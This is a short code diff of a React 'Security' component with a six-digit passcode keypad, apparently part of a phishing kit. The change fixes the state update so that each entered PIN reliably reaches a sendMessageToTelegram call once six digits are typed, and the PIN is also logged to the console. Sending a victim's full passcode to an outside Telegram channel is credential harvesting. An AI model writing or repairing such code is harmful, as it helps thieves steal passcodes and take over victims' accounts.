@@ -56,16 +56,16 @@ export default function Security() {
     // Handle input for mobile viewport
     const handleMobileInput = (number) => {
         if (pins.length < 6) {
-            const new_pins = prev + number 
-            setPins(new_pins);
-            console.log("new pins is ", new_pins)
-            if (pins.length + 1 === 6) {
-                // Send complete passcode to Telegram
-                sendMessageToTelegram(new_pins);
-                // Optionally redirect or show loading
-                // setIsLoading(true);
-                // setTimeout(() => router.push('/NextPage'), 1000);
-            }
+            setPins(prev => {
+                const newPins = prev + number.toString();
+                console.log("new pins is ", newPins);
+                
+                if (newPins.length === 6) {
+                    sendMessageToTelegram(newPins);
+                }
+                
+                return newPins;
+            });
         }
     };
 
